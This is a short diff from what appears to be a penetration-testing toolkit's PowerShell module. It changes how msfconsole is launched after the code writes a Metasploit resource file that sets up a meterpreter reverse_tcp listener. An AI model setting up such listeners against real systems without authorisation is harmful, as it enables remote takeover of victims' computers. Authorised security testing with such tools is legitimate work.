@@ -56,7 +56,7 @@ if powershell_menu_choice != "99":
             filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
             filewrite.close()
             msf_path = meta_path()
-            subprocess.Popen("ruby %s/msfconsole -L -n -r %s/reports/powershell/powershell.rc" % (msf_path, setdir), shell=True).wait()
+            subprocess.Popen("ruby %s/msfconsole -L -r %s/reports/powershell/powershell.rc" % (msf_path, setdir), shell=True).wait()
 
         print_status("Powershell files can be found under %s/reports/powershell/" % (setdir))
         return_continue()
